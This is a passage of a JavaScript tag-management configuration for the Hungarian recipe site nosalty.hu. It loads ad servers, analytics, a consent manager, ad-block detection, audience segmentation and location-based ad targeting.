// Enhanced tracking behavior
const keysToWatch = window.keysToWatch;
Tagging = function (context) {
  this.site = 'nosalty2';
  this.zone = 'nyitooldal';
  this.protocol = window.location.protocol;
  this.autodetect_url = this.protocol + '//cts.p24.hu/service/detect/';
  this.context = context;
  this.positions = {};
  this.positions_weighted = {};
  this.positions['body-end'] = '[{\"service_name\": \"Adverticum AdServer\", \"weight\": null, \"source\": \"<script type=\\"text/javascript\\" src=\\"//stat.p24.hu/CTS/helper-scripts/waterfall_empty/closer.min.js\\"></script>\"}, {\"service_name\": \"Adverticum AdServer\", \"weight\": null, \"source\": \"<script type=\\"text/javascript\\" src=\\"//ad.adverticum.net/g3.js\\"></script>\"}, {\"service_name\": \"Strossle\", \"weight\": null, \"source\": \"<script src=\\"//widgets.sprinklecontent.com/v2/sprinkle.js\\" async></script>\"}, {\"service_name\": \"A42A6Cblck\", \"weight\": null, \"source\": \"<script>    (function () {        var evtName = \\"_ceAblfinish\\";        var prepareData = function () {            var cssName = \\"nosaltyhu\\";            var queryStrTimestamp = \\"?t=20201126\\";            var replaceMe = {                from: \\"##hostName##\\",                to: document.location.hostname.replace(/\\\\./g, \'\')            };            var insertElements = {                link: [{                    href: (cssName == undefined || cssName == \'\') ? \\"//adfree-stat.p3g.hu/layer/css/out/##hostName##.css\\" + queryStrTimestamp : \\"//adfree-stat.p3g.hu/layer/css/out/\\" + cssName + \\".css\\" + queryStrTimestamp,                    rel: \\"stylesheet\\",                    type: \\"text/css\\"                }],                script: [{                    src: \\"//adfree-stat.p3g.hu/layer/layer.min.js\\" + queryStrTimestamp,                    type: \\"text/javascript\\",                    onload: function () {                        if (typeof a2blckLayer != \\"undefined\\" && a2blckLayer.show != undefined && getA42A6CblckStatus() == 1) {                            a2blckLayer.show();                            var dataLayer = window.dataLayer || [];                            dataLayer.push({ \'event\': \'layer\', \'layerName\': \'prohibitad\' });                        }                    }                }]            };            var eltype = Object.keys(insertElements);            var isSubscribed = (typeof _ceSubscriptionDetect != \'undefined\' && _ceSubscriptionDetect.getSubscriptionData().isSubscribed) ? true : false;            var subscribedDataExists = (typeof _ceSubscriptionDetect != \'undefined\' && _ceSubscriptionDetect.getSubscriptionData().dataExists) ? true : false;            var getA42A6CblckStatus = function () {                var blckEd = 0;                if (typeof window.A42A6Cblck != \\"undefined\\" && window.A42A6Cblck.status != undefined) {                    blckEd = window.A42A6Cblck.status;                }                return blckEd;            };            if (getA42A6CblckStatus() == 1 && subscribedDataExists && !isSubscribed && typeof _ceCTSData != \\"undefined\\" && _ceCTSData.a2blckLayer != undefined) {                for (var i = 0; i < eltype.length; i++) {                    for (var j = 0; j < Object.keys(insertElements[eltype[i]]).length; j++) {                        var needElements = Object.keys(insertElements[eltype[i]])[j];                        var newEl = document.createElement(eltype[i]);                        for (var k = 0; k < needElements.length; k++) {                            var needElementAttr = Object.keys(insertElements[eltype[i]][needElements[k]]);                            for (var l = 0; l < Object.keys(needElementAttr).length; l++) {                                var needElementAttrVal = insertElements[eltype[i]][needElements[k]][needElementAttr[l]];                                if (needElementAttrVal != undefined && typeof needElementAttrVal == \'string\') {                                    needElementAttrVal = needElementAttrVal.replace(replaceMe.from, replaceMe.to);                                }                                newEl[needElementAttr[l]] = needElementAttrVal;                            }                        }                        document.head.appendChild(newEl);                    }                }            }        };        var init = function () {            var loadLayer = false;            if (typeof _ceCTSData != undefined && _ceCTSData.a2blckLayer != undefined) {                loadLayer = true;                if (_ceCTSData.a2blckLayer.displayed) {                    loadLayer = false;                }            }            if (loadLayer) {                prepareData();            }        };        document.addEventListener(evtName, init);        window.addEventListener(\'load\', init);    })();</script>\"}, {\"service_name\": \"Gemius\", \"weight\": null, \"source\": \"<script src=\\"//stat.p24.hu/CTS/measuring-codes/gem_stream.min.js?t=20210111\\" type=\\"text/javascript\\"></script>\"}, {\"service_name\": \"Sanoma/Surveysparrow\", \"weight\": null, \"source\": \"<div id=\\"ss_survey_widget_cts\\" class=\\"_ce_measure_widget\\" data-ce-measure-widget=\\"survey-form-ss\\"    style=\\"display:none;${survey_css}\\"><script>        (function () {            var placeholder = document.getElementById(\\"ss_survey_widget_cts\\");            try{                var conf = {};                if (placeholder != undefined && conf != undefined && conf != \'\' && conf != null  && Object.keys(conf).length > 0) {                    var s = document.createElement(\'script\');                    s.src = \'//stat.p24.hu/CTS/helper-scripts/survey/surveysparrow/ss.min.js?t=20230411\';                    s.onload = () => {                        const ssSurv = new _ceSsSurvey(conf);                        if (document.readyState === \\"interactive\\") {                            ssSurv.init();                        } else {                            window.addEventListener(\'DOMContentLoaded\', ssSurv.init);                        }                    };                    document.head.appendChild(s);                }else{                    if (placeholder != undefined) placeholder.parentNode.removeChild(placeholder);                }            }catch(e){                if (placeholder != undefined) placeholder.parentNode.removeChild(placeholder);            }        })();    </script></div>\"}, {\"service_name\": \"Gemius Traffic\", \"weight\": null, \"source\": \"<script type=\\"text/javascript\\">    (function () {        const insertGemiusTrackingCode = () => {            const extra = window.pp_gemius_extraparameters || \'\';            const identifier = window.pp_gemius_identifier != undefined ? window.pp_gemius_identifier.replace(\'USED_\', \'\') : \'\';            if (identifier != \'\') {                pp_gemius_hit(identifier, extra);            }        };        if (typeof document.addEventListener !== \'undefined\') {            window.addEventListener(\\"_ce_gallery_pagination\\", insertGemiusTrackingCode);            window.addEventListener(\\"_ce_gem_pv\\", insertGemiusTrackingCode);        } else {            window.attachEvent(\\"_ce_gallery_pagination\\", insertGemiusTrackingCode);            window.attachEvent(\\"_ce_gem_pv\\", insertGemiusTrackingCode);        }    })();</script>\"}]';
  this.positions_weighted['body-end'] = false;
  this.positions['body-end-adv'] = '[{\"service_name\": \"Adverticum AdServer\", \"weight\": null, \"source\": \"<div id=\\"ctstemp\\" class=\\"goAdverticum a8a263be\\" style=\\"display: none;\\"><script>        (function () {            var insertedElement = document.getElementById(\'ctstemp\');            var zoneForDevice = \'\';            var dataAdsvName = \'\';            var isSubscribed = false;            if (typeof _ceSubscriptionDetect != \'undefined\' && _ceSubscriptionDetect.getSubscriptionData().isSubscribed) {                isSubscribed = true;            }            if (typeof _ceDeviceDetect.getDeviceType() !== \'undefined\') {                switch (_ceDeviceDetect.getDeviceType()) {                    case \'desktop\':                        zoneForDevice = \'5042998\';                        dataAdsvName = \'${adverticum_name}\';                        break;                    case \'mobile\':                        zoneForDevice = \'5454500\';                        dataAdsvName = \'${adverticum_name_mobile}\';                        break;                    case \'tablet\':                        zoneForDevice = \'${adv_zone_id_for_tablet}\';                        dataAdsvName = \'${adverticum_name_tablet}\';                        if (dataAdsvName == \\"\\") {                            dataAdsvName = \'${adverticum_name}\';                        }                        break;                }            }            if (zoneForDevice == \'\' || isSubscribed) {                insertedElement.parentNode.removeChild(insertedElement);            } else {                insertedElement.setAttribute(\'data-adsv-name\', dataAdsvName);                insertedElement.id = \'zone\' + zoneForDevice;                if (insertedElement.getAttribute(\\"ctsStyle\\") != null) {                    insertedElement.style = insertedElement.getAttribute(\\"ctsStyle\\");                    insertedElement.removeAttribute(\\"ctsStyle\\");                } else {                    insertedElement.removeAttribute(\\"style\\");                }            }        })();    </script></div>\"}]';
  this.positions_weighted['body-end-adv'] = false;
  this.positions['body-start'] = '[{\"service_name\": \"Sanoma\", \"weight\": null, \"source\": \"<script type=\\"text/javascript\\">\t(function() {        const insertBt = () => {\t\t\twindow._btq = window._btq || [];\t\t\twindow._btq.request = window._btq.request || function(){return{};};\t\t\tconst bt = document.createElement(\'script\');\t\t\tbt.type = \'text/javascript\';\t\t\tbt.async = true;\t\t\tbt.onload = function(){\t\t\t\twindow.dispatchEvent( new Event(\'btLoaded\') );\t\t\t};\t\t\tbt.src = (\'https:\' === document.location.protocol ? \'https://\' : \'http://\') + \'bt.p24.hu/btarget.js?t=20221006\';\t\t\tconst s = document.getElementsByTagName(\'script\')[0];\t\t\ts.parentNode.insertBefore(bt, s);\t\t};\t\tinsertBt();\t\twindow.addEventListener(\\"btAjaxLoad\\", insertBt);\t})();</script>\"}, {\"service_name\": \"Google Tag Manager\", \"weight\": null, \"source\": \"<noscript><iframe src=\\"//www.googletagmanager.com/ns.html?id=GTM-PSGTM7G\\"height=\\"0\\" width=\\"0\\" style=\\"display:none;visibility:hidden\\"></iframe></noscript><script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({\'gtm.start\':new Date().getTime(),event:\'gtm.js\'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!=\'dataLayer\'?\'&l=\'+l:\'\';j.async=true;j.src=\'//www.googletagmanager.com/gtm.js?id=\'+i+dl;f.parentNode.insertBefore(j,f);})(window,document,\'script\',\'dataLayer\',\'GTM-PSGTM7G\');</script>\"}, {\"service_name\": \"A42A6Cblck\", \"weight\": null, \"source\": \"<script src=\\"//adfree-stat.p3g.hu/detect/detect.min.js?t=20221209\\"></script>\"}, {\"service_name\": \"Adverticum AdServer\", \"weight\": null, \"source\": \"<script src=\\"//ad.adverticum.net/g3.js\\"></script><script id=\\"tempAdScript\\" type=\\"text/javascript\\">    (function () {        const config = {            vendor: 798,            interstitial: {                zoneID: \\"5925479\\"            }        },            scriptPlaceholder = document.getElementById(\\"tempAdScript\\"),            createPlaceHolder = () => {                const d = document.createElement(\'div\');                d.id = \'ajaxZone\' + config.interstitial.zoneID;                document.body.appendChild(d);            },            isSubscribed = () => {                let isSubscribed = false;                if (typeof _ceSubscriptionDetect != \'undefined\' && _ceSubscriptionDetect.getSubscriptionData() != undefined && _ceSubscriptionDetect.getSubscriptionData().isSubscribed) {                    isSubscribed = true;                }                return isSubscribed;            },            isDesktop = () => {                let desktop = false;                if (typeof _ceDeviceDetect.getDeviceType() !== \'undefined\' && _ceDeviceDetect.getDeviceType() == \\"desktop\\") {                    desktop = true;                }                return desktop;            },            insertGoa3Banner = () => {                if (typeof goAdverticum3 != \\"undefined\\" && config.interstitial.zoneID != \'\') {                    goAdverticum3.onReady(function (goa3) {                        const cT = document.querySelector(\\"meta[name=\'customtarget\']\\") != undefined ? document.querySelector(\\"meta[name=\'customtarget\']\\").content : \'\';                        const goaJQ = goa3.getjQuery();                        createPlaceHolder();                        goaJQ(\\"#ajaxZone\\" + config.interstitial.zoneID).goa(config.interstitial.zoneID, {                            p: 100, zP: \\"\\", fP: \\"\\", cT: cT                        });                    });                }            };        window.__tcfapi(\\"addEventListener\\", 2, (tcData, success) => {            if (success && (tcData.eventStatus === \'tcloaded\' || tcData.eventStatus === \'useractioncomplete\')) {                let props = {                    consents: false,                    legitimateInterests: false                };                for (let prop of Object.keys(props)) {                    if (tcData.vendor[prop][config.vendor] != undefined && tcData.vendor[prop][config.vendor]) {                        props[prop] = true;                    }                }                if (props.consents && props.legitimateInterests) {                    if (!isSubscribed() && isDesktop()) {                        insertGoa3Banner();                    }                }            }        });        if (scriptPlaceholder != undefined) {            scriptPlaceholder.parentNode.removeChild(scriptPlaceholder);        }    })();</script>\"}]';
  this.positions_weighted['body-start'] = false;
  this.positions['content-bottom'] = '[]';
  this.positions_weighted['content-bottom'] = false;
  this.positions['content-top'] = '[{\"service_name\": \"Adverticum AdServer\", \"weight\": null, \"source\": \"<div id=\\"ctstemp\\" class=\\"goAdverticum a8a263be\\" style=\\"display: none;\\"><script>        (function () {            var insertedElement = document.getElementById(\'ctstemp\');            var zoneForDevice = \'\';            var dataAdsvName = \'\';            var isSubscribed = false;            if (typeof _ceSubscriptionDetect != \'undefined\' && _ceSubscriptionDetect.getSubscriptionData().isSubscribed) {                isSubscribed = true;            }            if (typeof _ceDeviceDetect.getDeviceType() !== \'undefined\') {                switch (_ceDeviceDetect.getDeviceType()) {                    case \'desktop\':                        zoneForDevice = \'5043018\';                        dataAdsvName = \'top\';                        break;                    case \'mobile\':                        zoneForDevice = \'6241272\';                        dataAdsvName = \'${adverticum_name_mobile}\';                        break;                    case \'tablet\':                        zoneForDevice = \'6241272\';                        dataAdsvName = \'${adverticum_name_tablet}\';                        if (dataAdsvName == \\"\\") {                            dataAdsvName = \'top\';                        }                        break;                }            }            if (zoneForDevice == \'\' || isSubscribed) {                insertedElement.parentNode.removeChild(insertedElement);            } else {                insertedElement.setAttribute(\'data-adsv-name\', dataAdsvName);                insertedElement.id = \'zone\' + zoneForDevice;                if (insertedElement.getAttribute(\\"ctsStyle\\") != null) {                    insertedElement.style = insertedElement.getAttribute(\\"ctsStyle\\");                    insertedElement.removeAttribute(\\"ctsStyle\\");                } else {                    insertedElement.removeAttribute(\\"style\\");                }            }        })();    </script></div>\"}, {\"service_name\": \"Criteo\", \"weight\": null, \"source\": \"<div id=\\"criteoTPL\\" ctsStyle=\\"width:0px;height:0px;margin:0 auto;overflow:hidden;${custom_css}\\" style=\\"display: none;\\"></div><script type=\\"text/javascript\\">    (function () {        var zoneid = 1470405,            height = 90,            width = 970,            criteoEl = document.getElementById(\\"criteoTPL\\"),            domReady = \\"${criteo_dom_ready}\\",            mutationTimeout = 5000,            mutationConf = { attributes: true, childList: true, subtree: true },            isSubscribed = false;        if (typeof _ceSubscriptionDetect != \'undefined\' && _ceSubscriptionDetect.getSubscriptionData() != undefined && _ceSubscriptionDetect.getSubscriptionData().isSubscribed) {            isSubscribed = true;        }        var insertCriteoBanner = function () {            if (!isSubscribed) {                criteoEl.id += Math.floor(Math.random() * 1000000);                if (criteoEl.getAttribute(\\"ctsStyle\\") != null) {                    criteoEl.style = criteoEl.getAttribute(\\"ctsStyle\\");                    criteoEl.removeAttribute(\\"ctsStyle\\");                } else {                    criteoEl.removeAttribute(\\"style\\");                }                var observer = new MutationObserver(function (mutations) {                    mutations.forEach(function () {                        criteoEl.style.width = width + \\"px\\";                        criteoEl.style.height = height + \\"px\\";                        criteoEl.style.marginTop = \\"10px\\";                        criteoEl.style.marginBottom = \\"10px\\";                        observer.disconnect();                    });                });                observer.observe(criteoEl, mutationConf);                setTimeout(function () { observer.disconnect(); }, mutationTimeout);                Criteo.events.push(function () {                    Criteo.DisplayAcceptableAdIfAdblocked({                        \\"zoneid\\": zoneid,                        \\"containerid\\": criteoEl.id,                        \\"overrideZoneFloor\\": true                    });                });            } else {                criteoEl.parentNode.removeChild(criteoEl);            }        };        if (domReady != undefined && domReady != \'\' && domReady) {            if (typeof document.addEventListener !== \'undefined\') {                document.addEventListener(\\"DOMContentLoaded\\", insertCriteoBanner);            } else {                window.attachEvent(\\"onload\\", insertCriteoBanner);            }        } else {            insertCriteoBanner();        }    })();</script>\"}]';
  this.positions_weighted['content-top'] = false;
  this.positions['head'] = '[{\"service_name\": \"CMP\", \"weight\": null, \"source\": \"<!-- Quantcast Choice. Consent Manager Tag v2.0 (for TCF 2.0) --><script type=\\"text/javascript\\" async=true>(function() {  var host =  \'nosalty.hu\' || window.location.hostname;  var element = document.createElement(\'script\');  var firstScript = document.getElementsByTagName(\'script\')[0];  var url = \'https://cmp.quantcast.com\'    .concat(\'/choice/\', \'ZWemmHq85Y1fR\', \'/\', host, \'/choice.js?tag_version=V2\');  var uspTries = 0;  var uspTriesLimit = 3;  element.async = true;  element.type = \'text/javascript\';  element.src = url;  firstScript.parentNode.insertBefore(element, firstScript);  function makeStub() {    var TCF_LOCATOR_NAME = \'__tcfapiLocator\';    var queue = [];    var win = window;    var cmpFrame;    function addFrame() {      var doc = win.document;      var otherCMP = !!(win.frames[TCF_LOCATOR_NAME]);      if (!otherCMP) {        if (doc.body) {          var iframe = doc.createElement(\'iframe\');          iframe.style.cssText = \'display:none\';          iframe.name = TCF_LOCATOR_NAME;          doc.body.appendChild(iframe);        } else {          setTimeout(addFrame, 5);        }      }      return !otherCMP;    }    function tcfAPIHandler() {      var gdprApplies;      var args = arguments;      if (!args.length) {        return queue;      } else if (args[0] === \'setGdprApplies\') {        if (          args.length > 3 &&          args[2] === 2 &&          typeof args[3] === \'boolean\'        ) {          gdprApplies = args[3];          if (typeof args[2] === \'function\') {            args[2](\'set\', true);          }        }      } else if (args[0] === \'ping\') {        var retr = {          gdprApplies: gdprApplies,          cmpLoaded: false,          cmpStatus: \'stub\'        };        if (typeof args[2] === \'function\') {          args[2](retr);        }      } else {        if(args[0] === \'init\' && typeof args[3] === \'object\') {          args[3] = Object.assign(args[3], { tag_version: \'V2\' });        }        queue.push(args);      }    }    function postMessageEventHandler(event) {      var msgIsString = typeof event.data === \'string\';      var json = {};      try {        if (msgIsString) {          json = JSON.parse(event.data);        } else {          json = event.data;        }      } catch (ignore) {}      var payload = json.__tcfapiCall;      if (payload) {        window.__tcfapi(          payload.command,          payload.version,          function(retValue, success) {            var returnMsg = {              __tcfapiReturn: {                returnValue: retValue,                success: success,                callId: payload.callId              }            };            if (msgIsString) {              returnMsg = JSON.stringify(returnMsg);            }            if (event && event.source && event.source.postMessage) {              event.source.postMessage(returnMsg, \'*\');            }          },          payload.parameter        );      }    }    while (win) {      try {        if (win.frames[TCF_LOCATOR_NAME]) {          cmpFrame = win;          break;        }      } catch (ignore) {}      if (win === window.top) {        break;      }      win = win.parent;    }    if (!cmpFrame) {      addFrame();      win.__tcfapi = tcfAPIHandler;      win.addEventListener(\'message\', postMessageEventHandler, false);    }  };  makeStub();  var uspStubFunction = function() {    var arg = arguments;    if (typeof window.__uspapi !== uspStubFunction) {      setTimeout(function() {        if (typeof window.__uspapi !== \'undefined\') {          window.__uspapi.apply(window.__uspapi, arg);        }      }, 500);    }  };  var checkIfUspIsReady = function() {    uspTries++;    if (window.__uspapi === uspStubFunction && uspTries < uspTriesLimit) {      console.warn(\'USP is not accessible\');    } else {      clearInterval(uspInterval);    }  };  if (typeof window.__uspapi === \'undefined\') {    window.__uspapi = uspStubFunction;    var uspInterval = setInterval(checkIfUspIsReady, 6000);  }})();</script><!-- End Quantcast Choice. Consent Manager Tag v2.0 (for TCF 2.0) -->\"}, {\"service_name\": \"Sanoma\", \"weight\": null, \"source\": \"<script src=\\"//stat.p24.hu/mobile_detect/mobile_detect.js\\"></script>\"}, {\"service_name\": \"Gemius Traffic\", \"weight\": null, \"source\": \"<script type=\\"text/javascript\\">    const pp_gemius_use_cmp = true;    const pp_gemius_cmp_timeout = Infinity;(function () {    function killAccentedChars(input) {        var inputStr = \'\';        if (input != undefined && input != null && input != \'\') {            if (typeof input == \\"string\\") {                inputStr = input.normalize(\\"NFD\\").replace(/[\\u0300-\\u036f]/g, \\"\\")            } else {                for (var i = 0; i < input.length; i++) {                    inputStr += input[i].normalize(\\"NFD\\").replace(/[\\u0300-\\u036f]/g, \\"\\") + \',\';                }                inputStr = inputStr.slice(0, -1);            }        }        return inputStr;    }    var properGemId = (\'${gemius_trackid}\' != \'\' ? \'${gemius_trackid}\' : \'Ajs7WSrDlJGZ1Lq99uZ5jtTI7AmBAnixbb5mle_b85X.X7\');    var extraparamArr = [];    var extraparamObj = _ceCTSData != undefined && _ceCTSData.gem != undefined ? _ceCTSData.gem.params : {};    if (        typeof _ceDeviceDetect.getDeviceType() !== \'undefined\' &&        _ceDeviceDetect.getDeviceType() != \'desktop\' &&        \'Ajs7WSrDlJGZ1Lq99uZ5jtTI7AmBAnixbb5mle_b85X.X7\' != \'\'    ) {        properGemId = \'Ajs7WSrDlJGZ1Lq99uZ5jtTI7AmBAnixbb5mle_b85X.X7\';    }    window[\'pp_gemius_identifier\'] = properGemId;    for (var i = 0; i < Object.keys(extraparamObj).length; i++) {        var key = Object.keys(extraparamObj)[i];        var val = decodeURIComponent(extraparamObj[key]);        if (key != undefined && key != null && val != undefined && val != null) {            extraparamArr.push(key + \'=\' + killAccentedChars(val).toLowerCase());        }    }    window[\'pp_gemius_extraparameters\'] = extraparamArr;})();function gemius_pending(i) { window[i] = window[i] || function () { var x = window[i + \'_pdata\'] = window[i + \'_pdata\'] || []; x[x.length] = arguments; }; };gemius_pending(\'gemius_hit\'); gemius_pending(\'gemius_event\'); gemius_pending(\'pp_gemius_hit\'); gemius_pending(\'pp_gemius_event\');(function (d, t) {    try {        var gt = d.createElement(t), s = d.getElementsByTagName(t)[0], l = \'http\' + ((location.protocol == \'https:\') ? \'s\' : \'\'); gt.setAttribute(\'async\', \'async\');        gt.setAttribute(\'defer\', \'defer\'); gt.src = l + \'://gahu.hit.gemius.pl/xgemius.js\'; s.parentNode.insertBefore(gt, s);    } catch (e) { }})(document, \'script\');</script>\"}, {\"service_name\": \"Sanoma\", \"weight\": null, \"source\": \"<script type=\\"text/javascript\\" src=\\"//ad-blacklist.p24.hu/adx_blacklist.js\\"></script><script type=\\"text/javascript\\" src=\\"//ad-blacklist.p24.hu/rubicon_blacklist.js\\"></script><script type=\\"text/javascript\\">    (function(){        var blacklistsToCheck = [\'ADX\', \'RUBICON\'];        for (var i=0; i<blacklistsToCheck.length; i++) {            var typeName = blacklistsToCheck[i].charAt(0) + blacklistsToCheck[i].substr(1).toLowerCase();            window[\'no\' + blacklistsToCheck[i]] = false;            if (                typeof window[\'blck\' + typeName] != \'undefined\' &&                typeof window[\'blck\' + typeName][window.location.hostname] != \'undefined\' &&                window[\'blck\' + typeName][window.location.hostname].indexOf(location.pathname) >= 0            ) {                window[\'no\' + blacklistsToCheck[i]] = true;            }        }    })();</script>\"}, {\"service_name\": \"Adverticum AdServer\", \"weight\": null, \"source\": \"<script src=\\"//stat.p24.hu/CTS/helper-scripts/ip2isp/ip2isp.min.js\\"></script>\"}, {\"service_name\": \"Sanoma\", \"weight\": null, \"source\": \"<script type=\\"text/javascript\\" src=\\"//segment.p24.hu/cerment.min.js?t=20230202\\" async></script>\"}, {\"service_name\": \"Sanoma/Nosalty\", \"weight\": null, \"source\": \"<script type=\\"text/javascript\\" src=\\"//stat.p24.hu/CTS/measuring-codes/nosalty.main.min.js?t=20230223\\"></script>\"}, {\"service_name\": \"Google Adverts\", \"weight\": null, \"source\": \"<script>    if (typeof _ceDeviceDetect != \'undefined\' && typeof _ceDeviceDetect.getDeviceType == \'function\') {        var _ceDisplayData = _ceDisplayData || {},            googletag,            loader = function (multipleAds) {                _ceDisplayData.gpt = _ceDisplayData.gpt || { items: [], defContName: \'div-gpt-ad\' };                (function () {                    var scriptInserter = document.createElement(\'script\');                    scriptInserter.src = \'https://www.googletagservices.com/tag/js/gpt.js\';                    scriptInserter.async = true;                    /*document.head.appendChild(scriptInserter);*/                    document.head.insertBefore(scriptInserter, document.head.firstChild);                })();                if (multipleAds) {                    googletag = {};                    googletag.cmd = [];                } else {                    googletag = googletag || {};                    googletag.cmd = googletag.cmd || [];                }                googletag.cmd.push(function () {                    googletag.pubads().enableSingleRequest();                    googletag.pubads().collapseEmptyDivs();                    googletag.enableServices();                });            };        loader();        window.addEventListener(\'_ceDisplayDataLoadHeader\', loader);    }</script>\"}, {\"service_name\": \"Criteo\", \"weight\": null, \"source\": \"<script async=\\"async\\" type=\\"text/javascript\\" src=\\"https://static.criteo.net/js/ld/publishertag.js\\"></script><script>    window.Criteo = window.Criteo || {};    window.Criteo.events = window.Criteo.events || [];</script>\"}, {\"service_name\": \"Sanoma\", \"weight\": null, \"source\": \"<script type=\\"text/javascript\\">window[\'_pONmOJ\'] = {    userdbId: 58,    varName: \'audiences\',    sessionVarName: \'audience_segments\',    initScriptId: \'_btInitScrpt\',    btSegements: {        raw: {},        decoded: {}    },    sessionReady: function(input) {        this.btSegements.raw = input || {};        if (this.btSegements.raw.hasOwnProperty(this.sessionVarName) === true) {            this.btSegements.decoded[this.sessionVarName] = JSON.parse(this.btSegements.raw[this.sessionVarName]);            if (this.btSegements.decoded[this.sessionVarName].length > 0) {                var segmentsToSet = \',\' + this.btSegements.decoded[this.sessionVarName].join() + \',\';                this.addToCustomTarget(segmentsToSet);            }        }    },    addToCustomTarget: function(input) {        if (typeof input != \'undefined\') {            var metaData = {                pointer: document.getElementsByName(\'customtarget\')[document.getElementsByName(\'customtarget\').length - 1],                content: \'\',                parsed: {},                output: \'\'            };            metaData.parsed[this.userdbId] = {};            metaData.parsed[this.userdbId][this.varName] = \'\';            if (typeof metaData.pointer != \'undefined\') {                metaData.content = atob(metaData.pointer.content);                if (metaData.content.length > 0) {                    var metaParts = metaData.content.split(\'&\');                    var currentUserdb = 0;                    for (var i=0; i<metaParts.length; i++) {                        var metaKeyVal = metaParts[i].split(\'=\');                        if (metaKeyVal[0] == \'userdb_id\') {                            currentUserdb = metaKeyVal[1];                            if (typeof metaData.parsed[currentUserdb] == \'undefined\') {                                metaData.parsed[currentUserdb] = {};                            }                        } else {                            metaData.parsed[currentUserdb][metaKeyVal[0]] = metaKeyVal[1];                        }                    }                }            } else {                metaData.pointer = document.createElement(\'meta\');                metaData.pointer.name = \'customtarget\';                document.getElementsByTagName(\'head\')[0].appendChild(metaData.pointer);            }            metaData.parsed[this.userdbId][this.varName] = metaData.parsed[this.userdbId][this.varName] + input;            metaData.parsed[this.userdbId][this.varName] = metaData.parsed[this.userdbId][this.varName].replace(/[,]{2,}/g, \',\');            for (var key in metaData.parsed) {                if (metaData.parsed.hasOwnProperty(key)) {                    metaData.output += \'userdb_id=\' + key + \'&\';                    for (var prop in metaData.parsed[key]) {                        if (metaData.parsed[key].hasOwnProperty(prop)) {                            metaData.output += prop + \'=\' + metaData.parsed[key][prop] + \'&\';                        }                    }                }            }            metaData.output = metaData.output.replace(/\\&$/g, \'\');            metaData.pointer.content = btoa(metaData.output);        }    },    go: function() {        _btq.request(this.sessionVarName, function(input){            _pONmOJ.sessionReady.apply(window[\'_pONmOJ\'], [input]);        });    }};window.addEventListener(\'btLoaded\', function(ev){_pONmOJ.go();});</script>\"}, {\"service_name\": \"Adverticum AdServer\", \"weight\": null, \"source\": \"<script>function ip2latlong(data) {    centralGeoTarget.ip2latlong(data);}var centralGeoTarget = {    referrer: document.referrer,    geoLocInfo: \\"geoLocInfo\\",    onPositionUpdate: function (position) {        var latitude = position.coords.latitude,            longitude = position.coords.longitude;        centralGeoTarget.buildUpMetaTag(latitude, longitude);        var geoLocationInfoSting = \'latitude=\' + latitude + \'|longitude=\' + longitude;        centralGeoTarget.createCookie(centralGeoTarget.geoLocInfo, geoLocationInfoSting, 168);    },    ip2latlong: function (data) {        var latitude = data.latitude,            longitude = data.longitude;        centralGeoTarget.buildUpMetaTag(latitude, longitude);        if (centralGeoTarget.readCookie(centralGeoTarget.geoLocInfo) == \\"\\") {            var geoLocationInfoSting = \'latitude=\' + latitude + \'|longitude=\' + longitude;            centralGeoTarget.createCookie(centralGeoTarget.geoLocInfo, geoLocationInfoSting, 168);        }    },    ipGeoLocation: function () {        script = document.createElement(\'script\');        script.type = \'text/javascript\';        script.src = \'//geoip.p24.hu/latlong.js\';        document.head.appendChild(script);    },    getLocationFromCookie: function () {        var coordinates = centralGeoTarget.readCookie(centralGeoTarget.geoLocInfo);        var coordinateVals = (function () {            var pairs = coordinates.split(\'|\');            var coo = {};            for (var i = 0; i < pairs.length; i++) {                var temp = pairs[i].split(\'=\');                coo[temp[0]] = temp[1];            }            return coo;        })();        if ((typeof coordinateVals.latitude == \'undefined\') || (typeof coordinateVals.longitude == \'undefined\')) {            return null;        }        var latitudeVal = parseFloat(coordinateVals.latitude),            longitudeVal = parseFloat(coordinateVals.longitude);        if (isNaN(latitudeVal) || isNaN(longitudeVal)) {            return null;        }        return {            latitude: latitudeVal,            longitude: longitudeVal        }    },    onPositionUpdateError: function (e) {        if (centralGeoTarget.readCookie(centralGeoTarget.geoLocInfo) == \\"\\") {            centralGeoTarget.ipGeoLocation();        } else {            var savedData = centralGeoTarget.getLocationFromCookie();            if (savedData != null) {                centralGeoTarget.buildUpMetaTag(savedData.latitude, savedData.longitude);            }        }    },    createCookie: function (cname, cvalue, expiry) {        var d = new Date();        d.setHours(d.getHours() + expiry);        var expires = \\"expires=\\" + d.toUTCString();        document.cookie = cname + \'=\' + cvalue + \';\' + expires + \';domain=.\' + document.domain + \';path=/\';    },    readCookie: function (cname) {        var name = cname + \\"=\\";        var ca = document.cookie.split(\';\');        for (var i = 0; i < ca.length; i++) {            var c = ca[i].trim();            if (c.indexOf(name) == 0) return c.substring(name.length, c.length);        }        return \\"\\";    },    buildUpMetaTag: function (latitude, longitude) {        var userdb_id = 65;        var createMetaElement = true;        var metaElements = document.querySelectorAll(\\"[name=\'customtarget\']\\");        if (metaElements != undefined) {            if (metaElements.length != undefined) {                if (metaElements.length > 0) {                    createMetaElement = false;                }            }        }        if (createMetaElement) {            var adverticumMeta = document.createElement(\'meta\');            adverticumMeta.name = \'customtarget\';            adverticumMeta.content = window.btoa(unescape(encodeURIComponent(\'userdb_id=\' + userdb_id + \'&latitude=\' + latitude + \'&longitude=\' + longitude)));            document.getElementsByTagName(\'head\')[0].appendChild(adverticumMeta);        } else {            var defaultMetaVal = metaElements[0].getAttribute(\\"content\\");            var newMetaVal = window.atob(unescape(defaultMetaVal)) + \'&userdb_id=\' + userdb_id + \'&latitude=\' + latitude + \'&longitude=\' + longitude;            metaElements[0].setAttribute(\\"content\\", window.btoa(unescape(encodeURIComponent(newMetaVal))));        }    },    init: function () {        if (typeof _ceDeviceDetect.getDeviceType() != \'undefined\') {            if (_ceDeviceDetect.getDeviceType() != \\"desktop\\") {                var savedData = centralGeoTarget.getLocationFromCookie();                if (centralGeoTarget.referrer.indexOf(\\"facebook\\") == -1) {                    if (savedData != null) {                        centralGeoTarget.buildUpMetaTag(savedData.latitude, savedData.longitude);                    } else {                        navigator.geolocation.getCurrentPosition(centralGeoTarget.onPositionUpdate, centralGeoTarget.onPositionUpdateError);                        if(centralGeoTarget.getLocationFromCookie() == null){                            centralGeoTarget.ipGeoLocation();                        }                    }                } else {                    if (savedData != null) {                        centralGeoTarget.buildUpMetaTag(savedData.latitude, savedData.longitude);                    } else {                        centralGeoTarget.ipGeoLocation();                    }                }            }        }    }};centralGeoTarget.init();</script>\"}, {\"service_name\": \"Adverticum AdServer\", \"weight\": null, \"source\": \"<script>(function () {    var userdbId = 